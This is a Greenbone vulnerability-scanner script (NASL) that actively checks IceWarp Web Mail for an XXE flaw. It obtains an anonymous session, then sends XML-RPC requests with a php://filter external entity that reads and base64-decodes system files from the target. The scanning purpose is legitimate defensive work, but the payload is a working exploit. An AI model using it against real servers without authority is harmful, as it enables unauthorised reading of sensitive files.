# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:icewarp:mail_server";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103750");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2013-08-07 16:35:04 +0200 (Wed, 07 Aug 2013)");
  script_tag(name:"cvss_base", value:"9.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:C/A:P");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("IceWarp Web Mail <= 10.4.5 Information Disclosure Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_icewarp_consolidation.nasl", "os_detection.nasl");
  script_mandatory_keys("icewarp/mailserver/http/detected");
  script_require_ports("Services/www", 32000);

  script_tag(name:"summary", value:"IceWarp Web Mail is prone to an information disclosure
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"The used XML parser is resolving external XML entities which
  allows attackers to read files and send requests to systems on the internal network (e.g port
  scanning). The risk of this vulnerability is highly increased by the fact that it can be
  exploited by anonymous users without existing user accounts.");

  script_tag(name:"impact", value:"Attackers can exploit these issues to gain access to potentially
  sensitive information.");

  script_tag(name:"affected", value:"IceWarp Mail Server version 10.4.5 and prior.");

  script_tag(name:"solution", value:"Update to the latest version.");

  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/icewarp-mail-server-1045-xss-xxe-injection");
  script_xref(name:"URL", value:"https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20130625-0_IceWarp_Mail_Server_Multiple_Vulnerabilities_v10.txt");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

url = "/rpc/gw.html";

host = http_host_name(port:port);

req = "GET " + url + ' HTTP/1.1\r\nHost: ' + host + '\r\n\r\n';
res = http_send_recv(port: port, data: req);

if("Invalid XML request" >!< res)
  exit(0);

xml = '<?xml version="1.0"?>
<methodCall>
  <methodName>LoginUser</methodName>
  <params>
    <param><value></value></param>
  </params>
</methodCall>';

len = strlen(xml);

req = 'POST ' + url + ' HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n' +
      'Content-Type: text/xml\r\n' +
      'Content-Length: ' + len + '\r\n' +
      '\r\n' + xml;
res = http_send_recv(port: port, data: req);

if ("<methodResponse>" >!< res)
  exit(0);

sess = eregmatch(pattern: "<value>([^<]+)</value>", string: res);
if (isnull(sess[1]) || strlen(sess[1]) < 1)
  exit(0);

session = sess[1];

files = traversal_files();

foreach file (keys(files)) {
  if (".ini" >< files[file])
    files[file] = "c:/" + files[file];
  else
    files[file] = "/" + files[file];

  xml = '<?xml version="1.0"?>
<!DOCTYPE VTTest [<!ENTITY bar SYSTEM "php://filter/read=convert.base64-encode/resource=' + files[file]  + '">]>
<methodCall>
  <methodName>ConvertVersit</methodName>
  <params>
    <param><value>' + session + '</value></param>
    <param><value>VTTest;&bar;</value></param>
    <param><value>XML</value></param>
  </params>
</methodCall>';

  len = strlen(xml);

  req = 'POST ' + url + ' HTTP/1.1\r\n' +
        'Host: ' + host + '\r\n' +
        'Content-Type: text/xml\r\n' +
        'Content-Length: ' + len + '\r\n' +
        '\r\n' + xml;
  res = http_send_recv(port: port, data: req);

  res = str_replace(string: res, find: "&lt;", replace: "<");
  res = str_replace(string: res, find: "&gt;", replace: ">");

  content = eregmatch(pattern: "<VTTest>([^<]+)</VTTest>", string: res);

  if (isnull(content[1]))
    continue;

  ret = base64_decode(str: content[1]);

  if (ereg(pattern: file, string: ret)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
